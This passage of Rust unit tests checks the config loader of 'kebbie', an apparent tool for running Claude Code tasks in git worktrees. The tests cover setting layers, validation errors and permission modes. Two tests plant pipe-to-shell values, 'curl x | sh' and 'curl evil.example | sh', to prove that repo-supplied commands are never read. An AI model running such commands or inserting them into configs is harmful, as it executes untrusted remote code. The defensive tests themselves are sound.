        let refused = parse_repo("[task]\nrules_skill = \"kebbie:../../outside\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
        assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", "app.toml").is_err());
    }

    #[test]
    fn a_released_worktree_loses_its_target_by_default_and_a_repo_names_its_own_folders_inside_it() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).clean_on_release, Setting { value: vec!["target".to_string()], layer: Layer::Default });
        let own = settings(&repo("[worktree]\nclean_on_release = [\"target\", \"node_modules/.cache\", \".next\"]\n"), &machine("[worktree]\nclean_on_release = []\n"));
        assert_eq!(own.clean_on_release, Setting { value: ["target", "node_modules/.cache", ".next"].map(str::to_string).to_vec(), layer: Layer::Repo });
        assert_eq!(settings(&Worktree::default(), &machine("[worktree]\nclean_on_release = []\n")).clean_on_release.value, Vec::<String>::new());
        for outside in ["../other", "/tmp", "", ".git", "a/../../b", "./target"] {
            let refused = parse_repo(&format!("[worktree]\nclean_on_release = [{outside:?}]\n"), "app.toml").unwrap_err();
            assert!(refused.contains("must be a folder inside the worktree"), "{outside}: {refused}");
        }
    }

    #[test]
    fn ci_watch_is_on_by_default_and_a_repo_can_turn_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).ci_watch, Setting { value: true, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[ci]\nwatch = false\n")).ci_watch, Setting { value: false, layer: Layer::Machine });
        let off = settings(&repo("[ci]\nwatch = false\n"), &machine("[ci]\nwatch = true\n"));
        assert_eq!(off.ci_watch, Setting { value: false, layer: Layer::Repo });
        assert!(parse_machine("[ci]\nwatch = \"yes\"\n", "config.toml").unwrap_err().contains("ci.watch: must be true or false"));
        assert!(unknown_repo("[ci]\npoll = 10\n").contains("ci.poll: unknown key; known keys here: watch"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: off });
        assert!(shown.contains("ci.watch = false  (repo config)"), "{shown}");
    }

    #[test]
    fn comments_are_watched_for_a_week_by_default_and_a_repo_can_change_either() {
        let default = settings(&Worktree::default(), &Machine::default());
        assert_eq!((default.comments_watch.value, default.comments_days.value), (true, 7));
        let set = settings(&repo("[comments]\nwatch = false\nwatch_days = 14\n"), &machine("[comments]\nwatch_days = 3\n"));
        assert_eq!((set.comments_watch.clone(), set.comments_days.clone()), (Setting { value: false, layer: Layer::Repo }, Setting { value: 14, layer: Layer::Repo }));
        assert!(parse_machine("[comments]\nwatch_days = 0\n", "config.toml").unwrap_err().contains("comments.watch_days: must be a whole number of days, 1 to 90"));
        assert!(unknown_repo("[comments]\npoll = 10\n").contains("comments.poll: unknown key; known keys here: watch, watch_days"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: set });
        assert!(shown.contains("comments.watch = false  (repo config)") && shown.contains("comments.watch_days = 14  (repo config)"), "{shown}");
    }

    #[test]
    fn the_permission_mode_is_claudes_own_default_until_set_and_a_repo_wins_over_the_machine() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).permission_mode, Setting { value: None, layer: Layer::Default });
        let machine_wide = settings(&Worktree::default(), &machine("[task]\npermission_mode = \"bypassPermissions\"\n"));
        assert_eq!(machine_wide.permission_mode, Setting { value: Some("bypassPermissions".to_string()), layer: Layer::Machine });
        let own = settings(&repo("[task]\npermission_mode = \"acceptEdits\"\n"), &machine("[task]\npermission_mode = \"bypassPermissions\"\n"));
        assert_eq!(own.permission_mode, Setting { value: Some("acceptEdits".to_string()), layer: Layer::Repo });
        for mode in PERMISSION_MODES {
            assert_eq!(repo(&format!("[task]\npermission_mode = \"{mode}\"\n")).permission_mode.as_deref(), Some(mode));
        }
        let refused = parse_machine("[task]\npermission_mode = \"yolo\"\n", "config.toml").unwrap_err();
        assert!(refused.contains("task.permission_mode: \"yolo\" is not a Claude Code permission mode; use \"default\", \"acceptEdits\", \"plan\", \"auto\", \"dontAsk\", \"bypassPermissions\""), "{refused}");
        assert!(parse_repo("[task]\npermission_mode = \"bypasspermissions\"\n", "app.toml").unwrap_err().contains("is not a Claude Code permission mode"), "a mode is spelled as Claude Code spells it");
        assert!(parse_repo("[task]\npermission_mode = true\n", "app.toml").unwrap_err().contains("task.permission_mode: must be a string"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
        assert!(shown.contains("task.permission_mode = \"acceptEdits\"  (repo config)") && shown.contains("never pushes nor approves"), "{shown}");
    }

    #[test]
    fn a_repos_test_commands_win_over_the_machines_and_add_to_the_built_in_ones() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).test_commands, Setting { value: Vec::new(), layer: Layer::Default });
        let own = settings(&repo("[task]\ntest_commands = [\"bin/test\", \" make check \"]\n"), &machine("[task]\ntest_commands = [\"just test\"]\n"));
        assert_eq!(own.test_commands, Setting { value: vec!["bin/test".to_string(), "make check".to_string()], layer: Layer::Repo });
        assert!(crate::evidence::commands(&own.test_commands.value).iter().any(|command| command == "cargo test"));
        assert!(parse_repo("[task]\ntest_commands = \"bin/test\"\n", "app.toml").unwrap_err().contains("task.test_commands: must be a list of strings"));
        assert!(parse_repo("[task]\ntest_commands = [\" \"]\n", "app.toml").unwrap_err().contains("must not be empty"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
        assert!(shown.contains("task.test_commands = [\"bin/test\", \"make check\"]  (repo config)") && shown.contains("\"cargo test\""), "{shown}");
    }

    #[test]
    fn also_noticed_files_by_default_and_a_repo_wins_over_the_machine() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).also_noticed, Setting { value: AlsoNoticed::Backlog, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[task]\nalso_noticed = \"ask\"\n")).also_noticed, Setting { value: AlsoNoticed::Ask, layer: Layer::Machine });
        let own = settings(&repo("[task]\nalso_noticed = \"fix\"\n"), &machine("[task]\nalso_noticed = \"ask\"\n"));
        assert_eq!(own.also_noticed, Setting { value: AlsoNoticed::Fix, layer: Layer::Repo });
        let refused = parse_repo("[task]\nalso_noticed = \"ignore\"\n", "app.toml").unwrap_err();
        assert!(refused.contains("task.also_noticed: \"ignore\" is not a choice; use \"backlog\", \"fix\" or \"ask\""), "{refused}");
        assert!(parse_machine("[task]\nalso_noticed = true\n", "config.toml").unwrap_err().contains("task.also_noticed: must be a string"));
        assert!(unknown_repo("[task]\nnoticed = \"fix\"\n").contains("known keys here: rules_skill, test_commands, also_noticed, permission_mode"));
        let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
        assert!(shown.contains("task.also_noticed = \"fix\"  (repo config)") && shown.contains("outside its task"), "{shown}");
    }

    #[test]
    fn an_empty_file_is_every_default() {
        assert_eq!(machine(""), Machine::default());
        assert_eq!(repo(""), Worktree::default());
        let missing = std::env::temp_dir().join(format!("kebbie-config-missing-{}.toml", std::process::id()));
        assert_eq!(load_machine(&missing).unwrap(), Machine::default());
        assert_eq!(load_repo(&missing).unwrap(), Worktree::default());
        let defaults = settings(&Worktree::default(), &Machine::default());
        assert_eq!(defaults.sources, Setting { value: vec![Source::Local], layer: Layer::Default }, "a fresh install has a working Backlog column");
        assert_eq!(defaults.setup_skill, Setting { value: DEFAULT_SETUP_SKILL.to_string(), layer: Layer::Default });
        assert_eq!(defaults.setup_command, Setting { value: None, layer: Layer::Default }, "none means bin/setup-worktree when it exists");
        assert_eq!(defaults.dev_server, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.dev_worker, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.dev_url, Setting { value: Some(DEFAULT_DEV_URL.to_string()), layer: Layer::Default });
        assert_eq!(defaults.rules_skill, Setting { value: DEFAULT_RULES_SKILL.to_string(), layer: Layer::Default });
        assert_eq!(defaults.review_model, Setting { value: None, layer: Layer::Default });
        assert_eq!(defaults.notify_command, Setting { value: None, layer: Layer::Default }, "no command, no notifications");
    }

    #[test]
    fn reads_the_machine_keys() {
        let config = machine(MACHINE);
        assert_eq!(config.sources, Some(vec![Source::Vault, Source::Linear]));
        assert_eq!(config.worktree.setup_skill.as_deref(), Some("my-tools:set-up-worktree"));
        assert_eq!(config.worktree.dev_server.as_deref(), Some("bin/dev"));
        assert_eq!(machine("[board.backlog]\nsources = []\n").sources, Some(Vec::new()));
        assert_eq!(settings(&Worktree::default(), &machine("[board.backlog]\nsources = []\n")).sources.value, Vec::new(), "an explicit empty list turns the backlog off");
        assert_eq!(machine("[board.backlog]\nsources = [\"local\", \"vault\"]\n").sources, Some(vec![Source::Local, Source::Vault]));
    }

    #[test]
    fn a_repo_config_holds_worktree_and_actions_together() {
        let own = repo(REPO);
        assert_eq!(own.setup_skill.as_deref(), Some("app-tools:set-up-worktree"));
        assert_eq!(own.dev_server.as_deref(), Some("npm run dev"));
        let (actions, errors) = crate::actions::parse(REPO, "app.toml");
        assert!(errors.is_empty(), "{errors:?}");
        assert_eq!(actions[0].title, "Build");
    }

    #[test]
    fn each_key_comes_from_the_highest_layer_that_sets_it() {
        let both = settings(&repo(REPO), &machine(MACHINE));
        assert_eq!(both.setup_skill, Setting { value: "app-tools:set-up-worktree".to_string(), layer: Layer::Repo });
        assert_eq!(both.dev_server, Setting { value: Some("npm run dev".to_string()), layer: Layer::Repo });
        assert_eq!(both.sources.layer, Layer::Machine);
        let skill_only = settings(&repo("[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\n"), &machine(MACHINE));
        assert_eq!(skill_only.setup_skill.layer, Layer::Repo);
        assert_eq!(skill_only.dev_server, Setting { value: Some("bin/dev".to_string()), layer: Layer::Machine });
        let server_only = settings(&repo("[worktree]\ndev_server = \"npm run dev\"\n"), &machine(MACHINE));
        assert_eq!(server_only.setup_skill, Setting { value: "my-tools:set-up-worktree".to_string(), layer: Layer::Machine });
        assert_eq!(server_only.dev_server.layer, Layer::Repo);
        let machine_only = settings(&Worktree::default(), &machine(MACHINE));
        assert_eq!((machine_only.setup_skill.layer, machine_only.dev_server.layer), (Layer::Machine, Layer::Machine));
        let repo_only = settings(&repo(REPO), &Machine::default());
        assert_eq!((repo_only.setup_skill.layer, repo_only.dev_server.layer, repo_only.sources.layer), (Layer::Repo, Layer::Repo, Layer::Default));
    }

    fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kebbie-config-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn a_worktree_reads_the_repo_config_named_after_its_main_checkout() {
        let root = scratch("repo");
        let dir = root.join("app");
        std::fs::create_dir_all(&dir).unwrap();
        crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
        crate::repo::git(&dir, &["-c", "user.name=Ada", "-c", "user.email=ada@example.com", "commit", "--quiet", "--allow-empty", "-m", "first"]).unwrap();
        let worktree = root.join("wt1.app");
        crate::repo::git(&dir, &["worktree", "add", "--quiet", "--detach", &worktree.to_string_lossy()]).unwrap();
        let repos = root.join("repos");
        assert_eq!(repo_file_in(&repos, &worktree), repos.join("app.toml"));
        assert_eq!(repo_file_in(&repos, &dir), repos.join("app.toml"));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_kebbie_toml_inside_the_repo_is_never_read() {
        let root = scratch("ignored");
        let dir = root.join("app");
        std::fs::create_dir_all(&dir).unwrap();
        crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
        std::fs::write(dir.join(".kebbie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
        let file = repo_file_in(&root.join("repos"), &dir);
        assert!(!file.starts_with(&dir), "{}", file.display());
        assert_eq!(load_repo(&file).unwrap(), Worktree::default());
        assert_eq!(settings(&load_repo(&file).unwrap(), &Machine::default()).dev_server, Setting { value: None, layer: Layer::Default });
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_symlinked_repo_config_loads_and_shows_its_target() {
        let root = scratch("link");
        let (team, repos) = (root.join("team/kebbie"), root.join("repos"));
        std::fs::create_dir_all(&team).unwrap();
        std::fs::create_dir_all(&repos).unwrap();
        std::fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
        std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
        assert_eq!(load_repo(&repos.join("app.toml")).unwrap().dev_server.as_deref(), Some("bin/dev"));
        assert_eq!(shown(&repos.join("app.toml")), format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display()));
        std::os::unix::fs::symlink("../team/kebbie/gone.toml", repos.join("gone.toml")).unwrap();
        assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kebbie/gone.toml").display()));
        assert_eq!(shown(&repos.join("none.toml")), format!("{} (not found)", repos.join("none.toml").display()));
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn unknown_keys_are_named_with_the_file_and_ignored_while_bad_values_still_fail() {
        let warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/config.toml", &MACHINE_KEYS);
        let all = "board, worktree, task, review, notify, vault, update, restart, keeper, recover, machine, hub, keys, ci, comments, routines, report, issues";
        assert_eq!(warned("colour = 1
"), [format!("/home/u/.config/kebbie/config.toml: colour: unknown key; known keys here: {all}")]);
        assert_eq!(warned("[backlog]\nsources = []\n"), [format!("/home/u/.config/kebbie/config.toml: backlog: unknown key; known keys here: {all}")]);
        assert_eq!(warned("[board.backlog]\nsource = []\n"), ["/home/u/.config/kebbie/config.toml: board.backlog.source: unknown key; known keys here: sources, ongoing"]);
        assert_eq!(machine("colour = 1\n[backlog]\nsources = []\n[board]\ncolumns = 3\n[board.backlog]\nsource = []\n"), Machine::default(), "unknown keys and tables are ignored");
        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
        assert_eq!(error("colour = 1\n[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kebbie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
        assert!(error("[board.backlog]\nsources = \"vault\"\n").contains("board.backlog.sources: must be a list of strings"));
        assert!(error("[board.backlog]\nsources = [\"vault\", \"vault\"]\n").contains("listed twice"));
        assert!(unknown_machine("[repos.app]\nsetup = [\"x\"]\n").contains("repos: unknown key"));
        assert!(unknown_machine("[worktree]\nsetup = \"x\"\n").contains("worktree.setup: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name"));
        assert!(error("[worktree]\ndev_server = [\"bin/dev\"]\n").contains("worktree.dev_server: must be a string"));
        assert!(error("[worktree]\nsetup_skill = \" \"\n").contains("worktree.setup_skill: must not be empty"));
        assert!(error("not toml [").starts_with("/home/u/.config/kebbie/config.toml: TOML parse error"));
        let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
        assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kebbie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board] groups and [board.backlog] sources and ongoing in "));
        assert!(repo_error("colour = 1\n[ci]\nwatch = \"yes\"\n").contains("ci.watch: must be true or false"), "a known key with the wrong type still fails in a repo config");
        let repo_warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/repos/app.toml", &REPO_KEYS);
        assert_eq!(repo_warned("colour = 1\n"), ["/home/u/.config/kebbie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review, ci, comments, docs, routines"]);
        assert_eq!(repo_warned("[worktree]\nport = 3000\n"), ["/home/u/.config/kebbie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name, clean_on_release"]);
        assert_eq!(repo("colour = 1\n[lint]\nstrict = true\n[worktree]\nport = 3000\ndev_server = \"bin/dev\"\n").dev_server, Some("bin/dev".to_string()), "a repo config reads its known keys past unknown ones");
    }

    #[test]
    fn the_files_load_past_a_key_from_a_newer_kebbie_and_say_which() {
        let dir = scratch("newer");
        let config = dir.join("config.toml");
        std::fs::write(&config, "[update]\nchannel = \"main\"\nmirror = \"x\"\n\n[board]\nlanes = 2\n\n[signals]\nsample = 0.5\n").unwrap();
        let (machine, unknown) = check_machine(&config).unwrap();
        assert_eq!(machine.channel, Some(Channel::Main));
        assert_eq!(unknown.iter().map(|line| line.split(": ").nth(1).unwrap_or_default()).collect::<Vec<_>>(), ["signals", "board.lanes", "update.mirror"]);
        assert_eq!(load_machine(&config).unwrap().channel, Some(Channel::Main));
        let file = dir.join("app.toml");
        std::fs::write(&file, "[review]\nmodel = \"opus\"\neffort = \"high\"\n\n[lint]\nstrict = true\n").unwrap();
        let (worktree, unknown) = check_repo(&file).unwrap();
        assert_eq!(worktree.review_model.as_deref(), Some("opus"));
        assert_eq!(unknown.len(), 2, "{unknown:?}");
        assert!(unknown.iter().all(|line| line.starts_with(&file.display().to_string())), "{unknown:?}");
        std::fs::write(&config, "[restart]\nidle_minutes = \"soon\"\n").unwrap();
        assert!(check_machine(&config).unwrap_err().contains("restart.idle_minutes: must be a whole number"), "a known key with the wrong type still fails");
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn the_update_channel_reads_past_everything_else_in_config_toml() {
        let dir = scratch("channel");
        let config = dir.join("config.toml");
        assert_eq!(channel_in(&config).unwrap(), Channel::Release, "no file is the default channel");
        std::fs::write(&config, "colour = 1\n\n[update]\nchannel = \"main\"\nmirror = \"x\"\n\n[signals]\nsample = 0.5\n\n[restart]\nidle_minutes = \"soon\"\n").unwrap();
        assert_eq!(channel_in(&config).unwrap(), Channel::Main, "unknown keys and tables and a bad value elsewhere leave update alone");
        std::fs::write(&config, "[update]\nchannel = \"stable\"\n").unwrap();
        assert!(channel_in(&config).unwrap_err().contains("update.channel: \"stable\" is not a channel"));
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn the_review_model_comes_from_either_file_the_repo_first() {
        let from_machine = machine("[review]\nmodel = \"opus\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).review_model, Setting { value: Some("opus".to_string()), layer: Layer::Machine });
        let both = settings(&repo("[review]\nmodel = \"sonnet\"\n"), &from_machine);
        assert_eq!(both.review_model, Setting { value: Some("sonnet".to_string()), layer: Layer::Repo });
        assert!(unknown_repo("[review]\nmodle = \"opus\"\n").contains("review.modle: unknown key; known keys here: model"));
        assert!(parse_machine("[review]\nmodel = \"\"\n", "config.toml").unwrap_err().contains("review.model: must not be empty"));
        let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both };
        assert!(describe(&loaded).contains("review.model = \"sonnet\"  (repo config)"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("review.model = none  (default)\n  The model kebbie review"));
    }

    #[test]
    fn the_notify_command_is_machine_config_only() {
        let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"\n");
        assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KEBBIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
        assert!(refused.starts_with("/home/u/.config/kebbie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
        assert!(parse_repo("[notify]\n", "app.toml").unwrap_err().contains("lives in config.toml"));
        let sneaked = Worktree { notify_command: Some("bin/notify".to_string()), ..Worktree::default() };
        assert_eq!(settings(&sneaked, &from_machine).notify_command.layer, Layer::Machine, "the repo layer is never read for it");
        assert!(unknown_machine("[notify]\ncmd = \"x\"\n").contains("notify.cmd: unknown key; known keys here: command"));
        assert!(parse_machine("[notify]\ncommand = \" \"\n", "config.toml").unwrap_err().contains("notify.command: must not be empty"));
        assert!(parse_machine("[notify]\ncommand = [\"x\"]\n", "config.toml").unwrap_err().contains("notify.command: must be a string"));
        assert!(parse_machine("notify = \"x\"\n", "config.toml").unwrap_err().contains("notify: must be a table"));
        let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &from_machine) };
        assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
        let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
        assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kebbie runs"));
        assert!(describe(&default).contains("config.toml only."));
    }

    #[test]
    fn board_groups_take_the_listed_order_and_the_rest_follow_by_default() {
        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
        let set = settings(&Worktree::default(), &machine("[board]\ngroups = [\"ready-to-push\", \"waiting-for-work\"]\n"));
        assert_eq!(set.groups.value, [Group::ReadyToPush, Group::Idle, Group::NeedsYou, Group::Working, Group::InReview, Group::CiRunning, Group::Queued]);
        assert_eq!(settings(&Worktree::default(), &Machine::default()).groups.value, Group::ALL, "no list keeps today's order");
        assert_eq!(error("[board]\ngroups = [\"needs-me\"]\n"), "/home/u/.config/kebbie/config.toml: board.groups: \"needs-me\" is not a group; use \"needs-you\", \"working\", \"in-review\", \"ready-to-push\", \"ci-running\", \"waiting-for-work\", \"queued\"");
        assert!(error("[board]\ngroups = [\"queued\", \"queued\"]\n").contains("board.groups: \"queued\" is listed twice"));
        assert!(unknown_machine("[board]\ncolumns = []\n").contains("board.columns: unknown key; known keys here: groups, backlog"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
        assert!(shown.contains("board.groups = [\"ready-to-push\", \"waiting-for-work\", \"needs-you\", \"working\", \"in-review\", \"ci-running\", \"queued\"]  (machine config)\n  The order of the Work column's groups"), "{shown}");
    }

    #[test]
    fn ongoing_sits_on_top_unless_config_toml_moves_or_hides_it() {
        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
        assert_eq!(settings(&Worktree::default(), &Machine::default()).ongoing.value, OngoingAt::Top);
        assert_eq!(machine("[board.backlog]\nongoing = \"bottom\"\n").ongoing, Some(OngoingAt::Bottom));
        assert_eq!(machine("[board.backlog]\nongoing = \"hidden\"\n").ongoing, Some(OngoingAt::Hidden));
        assert_eq!(error("[board.backlog]\nongoing = \"left\"\n"), "/home/u/.config/kebbie/config.toml: board.backlog.ongoing: \"left\" is not a place; use \"top\", \"bottom\" or \"hidden\"");
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
        assert!(shown.contains("board.backlog.ongoing = \"top\"  (default)\n  Where the Backlog column shows ONGOING"), "{shown}");
    }

    #[test]
    fn restarts_are_automatic_after_ten_idle_minutes_unless_config_toml_says_otherwise() {
        let default = settings(&Worktree::default(), &Machine::default());
        assert_eq!((default.idle_minutes, default.auto_restart), (Setting { value: 10, layer: Layer::Default }, Setting { value: true, layer: Layer::Default }));
        let set = settings(&Worktree::default(), &machine("[restart]\nidle_minutes = 25\nauto = false\n"));
        assert_eq!((set.idle_minutes.value, set.auto_restart.value, set.auto_restart.layer), (25, false, Layer::Machine));
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        for bad in ["0", "1441", "-3", "\"10\"", "2.5"] {
            assert!(error(&format!("[restart]\nidle_minutes = {bad}\n")).contains("restart.idle_minutes: must be a whole number of minutes, 1 to 1440"), "{bad}");
        }
        assert!(error("[restart]\nauto = \"no\"\n").contains("restart.auto: must be true or false"));
        assert!(unknown_machine("[restart]\nidle = 5\n").contains("restart.idle: unknown key; known keys here: idle_minutes, auto"));
        assert!(parse_repo("[restart]\nauto = false\n", "app.toml").unwrap_err().contains("restart: applies to every repo, so it lives in config.toml"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
        assert!(shown.contains("restart.auto = false  (machine config)\n  Whether kebbie restarts") && shown.contains("restart.idle_minutes = 25  (machine config)\n  How long a session that runs older code than is installed waits"), "{shown}");
    }

    #[test]
    fn the_lead_proposes_kebbie_issues_unless_config_toml_turns_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).propose_issues, Setting { value: true, layer: Layer::Default });
        let off = settings(&Worktree::default(), &machine("[issues]\npropose = false\n"));
        assert_eq!(off.propose_issues, Setting { value: false, layer: Layer::Machine });
        assert!(parse_machine("[issues]\npropose = \"no\"\n", "config.toml").unwrap_err().contains("issues.propose: must be true or false"));
        assert!(unknown_machine("[issues]\nask = true\n").contains("issues.ask: unknown key; known keys here: propose"));
        assert!(unknown_machine("[issues]\npropose = false\n").is_empty());
        assert!(parse_repo("[issues]\npropose = false\n", "app.toml").unwrap_err().contains("issues: applies to every repo, so it lives in config.toml; set [issues] propose in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("issues.propose = false  (machine config)\n  Whether the lead proposes saving a bug or wish about kebbie") && shown.contains("Takes effect when the lead next restarts"), "{shown}");
    }

    #[test]
    fn the_keeper_is_on_unless_config_toml_turns_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).keeper, Setting { value: true, layer: Layer::Default });
        let off = settings(&Worktree::default(), &machine("[keeper]\nenabled = false\n"));
        assert_eq!(off.keeper, Setting { value: false, layer: Layer::Machine });
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[keeper]\nenabled = \"no\"\n").contains("keeper.enabled: must be true or false"));
        assert!(unknown_machine("[keeper]\non = true\n").contains("keeper.on: unknown key; known keys here: enabled"));
        assert!(parse_repo("[keeper]\nenabled = false\n", "app.toml").unwrap_err().contains("keeper: applies to every repo, so it lives in config.toml; set [keeper] enabled in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("keeper.enabled = false  (machine config)\n  Whether one background kebbie keeper"), "{shown}");
    }

    #[test]
    fn the_machine_name_is_the_short_hostname_unless_config_toml_names_it() {
        let default = settings(&Worktree::default(), &Machine::default()).machine_name;
        assert_eq!(default.layer, Layer::Default);
        assert!(!default.value.is_empty() && !default.value.contains('.'), "{default:?}");
        let named = settings(&Worktree::default(), &machine("[machine]\nname = \"devbox\"\n"));
        assert_eq!(named.machine_name, Setting { value: "devbox".to_string(), layer: Layer::Machine });
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[machine]\nname = \"\"\n").contains("machine.name: must be a non-empty string"));
        assert!(error(&format!("[machine]\nname = \"{}\"\n", "x".repeat(65))).contains("at most 64 characters"));
        assert!(error("[machine]\nname = \"a\\tb\"\n").contains("without control characters"));
        assert!(error("[machine]\nname = 7\n").contains("machine.name: must be a string"));
        assert!(error("[machine]\nname = \"LocalHost\"\n").contains("\"localhost\" names every machine"));
        assert!(unknown_machine("[machine]\nhost = \"x\"\n").contains("machine.host: unknown key; known keys here: name"));
        assert!(parse_repo("[machine]\nname = \"x\"\n", "app.toml").unwrap_err().contains("machine: applies to every repo, so it lives in config.toml; set [machine] name in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: named });
        assert!(shown.contains("machine.name = \"devbox\"  (machine config)\n  The machine's one name"), "{shown}");
    }

    #[test]
    fn resuming_after_api_errors_is_on_unless_config_toml_turns_it_off() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).recover, Setting { value: true, layer: Layer::Default });
        let off = settings(&Worktree::default(), &machine("[recover]\nenabled = false\n"));
        assert_eq!(off.recover, Setting { value: false, layer: Layer::Machine });
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[recover]\nenabled = 1\n").contains("recover.enabled: must be true or false"));
        assert!(unknown_machine("[recover]\nretries = 3\n").contains("recover.retries: unknown key; known keys here: enabled"));
        assert!(parse_repo("[recover]\nenabled = false\n", "app.toml").unwrap_err().contains("recover: applies to every repo, so it lives in config.toml; set [recover] enabled in"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
        assert!(shown.contains("recover.enabled = false  (machine config)\n  Whether kebbie resumes a task"), "{shown}");
    }

    #[test]
    fn the_update_channel_is_release_unless_the_machine_config_says_main() {
        assert_eq!(settings(&Worktree::default(), &Machine::default()).channel, Setting { value: Channel::Release, layer: Layer::Default });
        assert_eq!(settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")).channel, Setting { value: Channel::Main, layer: Layer::Machine });
        assert_eq!(machine("[update]\nchannel = \"release\"\n").channel, Some(Channel::Release));
        assert_eq!(machine("[update]\n").channel, None);
        let error = |text: &str| parse_machine(text, "config.toml").unwrap_err();
        assert!(error("[update]\nchannel = \"stable\"\n").contains("update.channel: \"stable\" is not a channel; use \"main\" or \"release\""));
        assert!(unknown_machine("[update]\nchanel = \"main\"\n").contains("update.chanel: unknown key; known keys here: channel"));
        assert!(error("[update]\nchannel = 1\n").contains("update.channel: must be a string"));
        assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: update: applies to every repo"));
        let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
